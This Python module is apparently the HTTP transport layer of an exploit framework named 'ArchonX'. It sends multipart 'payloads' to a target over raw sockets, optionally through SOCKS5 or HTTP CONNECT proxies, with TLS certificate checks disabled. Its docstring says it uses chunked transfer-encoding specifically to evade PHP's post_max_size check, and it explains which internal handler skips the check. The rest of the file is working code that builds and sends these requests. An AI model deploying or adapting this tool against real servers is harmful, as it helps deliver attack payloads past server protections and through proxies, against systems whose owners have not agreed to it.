"""HTTP transport for ArchonX multipart payloads.

Raw socket HTTP/1.1 with:
  - chunked transfer-encoding (bypasses PHP's post_max_size check — no
    Content-Length means SG(request_info).content_length stays 0 and
    rfc1867_post_handler skips the size check)
  - SOCKS5 and HTTP CONNECT proxy support
  - connection retry with configurable delay
  - debug hooks through archonx.branding.log
"""
from __future__ import annotations

import socket
import ssl
import struct
import time
from dataclasses import dataclass

from .branding import log


DEFAULT_BOUNDARY = "C" * 10
MAX_RESPONSE = 4 << 20  # 4 MiB


@dataclass
class TransportConfig:
    host: str = "127.0.0.1"
    port: int = 80
    tls: bool = False
    proxy: str = ""
    timeout: float = 120.0
    retries: int = 1
    retry_delay: float = 0.5


def _connect(cfg: TransportConfig) -> socket.socket:
    if cfg.proxy:
        if cfg.proxy.startswith("socks5://"):
            return _socks5_connect(cfg)
        if cfg.proxy.startswith("http://"):
            return _http_proxy_connect(cfg)
        raise ValueError(f"unsupported proxy scheme: {cfg.proxy}")

    s = socket.create_connection((cfg.host, cfg.port), timeout=cfg.timeout)
    s.settimeout(cfg.timeout)
    if cfg.tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=cfg.host)
    return s


def _socks5_connect(cfg: TransportConfig) -> socket.socket:
    proxy_host, proxy_port = cfg.proxy.replace("socks5://", "").rsplit(":", 1)
    s = socket.create_connection((proxy_host, int(proxy_port)),
                                 timeout=cfg.timeout)
    s.settimeout(cfg.timeout)

    s.sendall(b"\x05\x01\x00")
    resp = s.recv(2)
    if resp != b"\x05\x00":
        s.close()
        raise ConnectionError("SOCKS5 handshake failed")

    addr = cfg.host.encode()
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(addr)]) + addr +
              struct.pack("!H", cfg.port))
    resp = s.recv(10)
    if len(resp) < 2 or resp[1] != 0:
        s.close()
        raise ConnectionError(
            f"SOCKS5 connect failed: status "
            f"{resp[1] if len(resp) > 1 else 'unknown'}"
        )

    if cfg.tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=cfg.host)
    return s


def _http_proxy_connect(cfg: TransportConfig) -> socket.socket:
    proxy_host, proxy_port = cfg.proxy.replace("http://", "").rsplit(":", 1)
    s = socket.create_connection((proxy_host, int(proxy_port)),
                                 timeout=cfg.timeout)
    s.settimeout(cfg.timeout)

    s.sendall(
        (f"CONNECT {cfg.host}:{cfg.port} HTTP/1.1\r\n"
         f"Host: {cfg.host}:{cfg.port}\r\n\r\n").encode()
    )
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk
    if b"200" not in resp.split(b"\r\n", 1)[0]:
        s.close()
        raise ConnectionError(
            f"HTTP CONNECT failed: {resp.split(b'\\r\\n')[0]}"
        )

    if cfg.tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=cfg.host)
    return s


def _raw_send(cfg: TransportConfig, data: bytes) -> bytes:
    for attempt in range(cfg.retries):
        try:
            log.debug(f"connect {cfg.host}:{cfg.port} "
                      f"attempt {attempt + 1}/{cfg.retries}")
            s = _connect(cfg)
            resp = bytearray()
            try:
                s.sendall(data)
                while len(resp) < MAX_RESPONSE:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    resp.extend(chunk)
            except OSError:
                pass
            finally:
                s.close()
            log.debug(f"recv {len(resp)}B")
            return bytes(resp)
        except OSError as exc:
            log.debug(f"connect failed: {exc}")
            if attempt < cfg.retries - 1:
                time.sleep(cfg.retry_delay)
    return b""


def send_chunked(cfg: TransportConfig, path: str, body: bytes,
                 boundary: str = DEFAULT_BOUNDARY,
                 chunk_size: int = 65536) -> bytes:
    log.debug(f"POST {path} [chunked] body={len(body)}B chunk={chunk_size}B")
    header = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {cfg.host}:{cfg.port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    wire = bytearray(header)
    for i in range(0, len(body), chunk_size):
        piece = body[i:i + chunk_size]
        wire += f"{len(piece):x}\r\n".encode() + piece + b"\r\n"
    wire += b"0\r\n\r\n"

    resp = _raw_send(cfg, bytes(wire))
    log.debug(f"resp {get_status_line(resp)}")
    log.hexdump(resp[:256])
    return resp


def send_plain(cfg: TransportConfig, path: str, body: bytes,
               boundary: str = DEFAULT_BOUNDARY) -> bytes:
    log.debug(f"POST {path} [plain] body={len(body)}B")
    header = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {cfg.host}:{cfg.port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    resp = _raw_send(cfg, header + body)
    log.debug(f"resp {get_status_line(resp)}")
    log.hexdump(resp[:256])
    return resp


def send_get(cfg: TransportConfig, path: str) -> bytes:
    log.debug(f"GET {path}")
    req = (
        f"GET {path} HTTP/1.0\r\n"
        f"Host: {cfg.host}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    resp = _raw_send(cfg, req)
    log.debug(f"resp {get_status_line(resp)}")
    return resp


def get_status_line(resp: bytes) -> str:
    if not resp:
        return ""
    return resp.split(b"\r\n", 1)[0][:60].decode("latin1", "replace")


def get_status_code(resp: bytes) -> int:
    parts = get_status_line(resp).split()
    if len(parts) >= 2 and parts[1].isdigit():
        return int(parts[1])
    return 0
